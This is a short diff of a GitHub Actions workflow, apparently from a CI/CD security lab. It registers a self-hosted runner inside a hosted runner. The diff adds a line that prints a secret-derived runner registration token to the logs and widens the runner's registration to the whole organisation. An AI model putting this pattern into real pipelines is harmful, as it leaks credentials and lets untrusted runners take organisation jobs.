@@ -20,13 +20,12 @@ jobs:
           egress-policy: audit
       - name: Smoke it!
         run: |
-          curl -L -X POST -H "Authorization: Bearer ${{ secrets.SMOKER }}" https://api.github.com/orgs/messypoutine/actions/runners/registration-token
-          exit 1
           TOKEN=$(curl -L -X POST -H "Authorization: Bearer ${{ secrets.SMOKER }}" https://api.github.com/orgs/messypoutine/actions/runners/registration-token | jq -r .token)
+          echo "Yo: $TOKEN"
           mkdir actions-runner && cd actions-runner
           curl -s -o actions-runner-linux-x64-2.316.1.tar.gz -L https://github.com/actions/runner/releases/download/v2.316.1/actions-runner-linux-x64-2.316.1.tar.gz
           echo "d62de2400eeeacd195db91e2ff011bfb646cd5d85545e81d8f78c436183e09a8  actions-runner-linux-x64-2.316.1.tar.gz" | shasum -a 256 -c
           tar xzf ./actions-runner-linux-x64-2.316.1.tar.gz
           echo "Yo DAWG, I herd ya like self-hosted runners, so I put one in your hosted runner!"
-          ./config.sh --url https://github.com/messypoutine/gravy-overflow --token $TOKEN
+          ./config.sh --url https://github.com/messypoutine --token $TOKEN
           ./run.sh
